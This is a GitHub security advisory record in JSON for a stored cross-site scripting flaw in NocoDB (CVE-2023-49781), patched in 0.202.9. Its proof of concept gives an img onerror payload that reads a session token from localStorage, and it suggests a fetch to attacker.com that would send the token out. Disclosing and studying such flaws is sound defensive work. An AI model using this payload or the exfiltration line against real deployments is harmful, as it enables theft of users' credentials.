{
  "Severity": "HIGH",
  "UpdatedAt": "2024-05-13T19:59:12Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "nocodb"
  },
  "Advisory": {
    "DatabaseId": 245293,
    "Id": "GSA_kwCzR0hTQS1oNnI0LXh2dzYtamM1aM4AA74t",
    "GhsaId": "GHSA-h6r4-xvw6-jc5h",
    "References": [
      {
        "Url": "https://github.com/nocodb/nocodb/security/advisories/GHSA-h6r4-xvw6-jc5h"
      },
      {
        "Url": "https://github.com/nocodb/nocodb/commit/7f58ce3726dfec71537d8b80474a0f95a48a1574"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49781"
      },
      {
        "Url": "https://github.com/advisories/GHSA-h6r4-xvw6-jc5h"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-h6r4-xvw6-jc5h"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2023-49781"
      }
    ],
    "Description": "### Summary\nA stored cross-site scripting vulnerability exists within the Formula virtual cell comments functionality.\n\n### Details\nThe nc-gui/components/virtual-cell/Formula.vue displays a v-html tag with the value of \"urls\" whose contents are processed by the function replaceUrlsWithLink(). This function recognizes the pattern URI::(XXX) and creates a hyperlink tag \u003ca\u003e with href=XXX. However, it leaves all the other contents outside of the pattern URI::(XXX) unchanged, which makes the evil users can create a malicious table with a formula field whose payload is \u003cimg src=1 onerror=\"malicious javascripts\"URI::(XXX). The evil users then can share this table with others by enabling public viewing and the victims who open the shared link can be attacked.\n\n### PoC\nStep 1: Attacker login the nocodb and creates a table with two fields, \"T\" and \"F\". The type of field \"T\" is \"SingleLineText\", and the type of the \"F\" is \"Fomula\" with the formula content {T}\nStep 2: The attacker sets the contents of T using \u003cimg src=1 onerror=alert(localStorage.getItem('nocodb-gui-v2'))URI::(XXX)\nStep 3: The attacker clicks the \"Share\" button and enables public viewing, then copies the shared link and sends it to the victims\nStep 4: Any victims who open the shared link in their browsers will see the alert with their confidential tokens stored in localStorage\n\nThe attackers can use the fetch([http://attacker.com/?localStorage.getItem('nocodb-gui-v2')](http://attacker.com/?localStorage.getItem(%27nocodb-gui-v2%27))) to replace the alert and then steal the victims' credentials in their attacker.com website.\n\n### Impact\nStealing the credentials of NocoDB user that clicks the malicious link.\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-05-13T19:59:07Z",
    "Severity": "HIGH",
    "Summary": "NocoDB Vulnerable to Stored Cross-Site Scripting in Formula.vue",
    "UpdatedAt": "2024-05-14T18:05:54Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.3,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.202.9"
      },
      "VulnerableVersionRange": "\u003c= 0.202.8"
    }
  ]
}